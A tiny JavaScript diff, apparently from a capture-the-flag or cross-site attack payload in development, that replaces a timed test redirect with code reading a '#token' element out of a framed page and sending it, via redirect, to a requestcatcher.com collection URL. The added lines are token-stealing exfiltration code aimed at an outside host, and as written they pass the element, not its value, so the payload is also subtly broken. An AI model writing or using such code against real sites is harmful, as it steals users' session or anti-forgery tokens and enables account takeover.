@@ -1,4 +1,3 @@
-setTimeout(() => {
-  window.location.href = `https://yt54h.requestcatcher.com/hello3`
-}, 2000)
+  const token = ifr.contentWindow.document.querySelector("#token")
+  window.location.href = `https://yt54h.requestcatcher.com/${token}`
 
